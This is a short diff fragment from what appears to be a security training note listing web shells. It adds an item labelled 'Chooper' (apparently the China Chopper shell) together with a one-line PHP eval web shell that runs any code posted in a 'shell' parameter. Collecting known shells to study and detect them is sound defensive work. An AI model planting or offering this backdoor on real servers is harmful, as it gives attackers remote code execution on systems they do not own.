@@ -62,3 +62,10 @@ if (isset($_POST['cmd'])) {
 
 <img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2012/File%20PNG/1.png'>
 
+3. Chooper
+
+```
+<?php @eval($_POST['shell']);?>
+```
+
+4. 
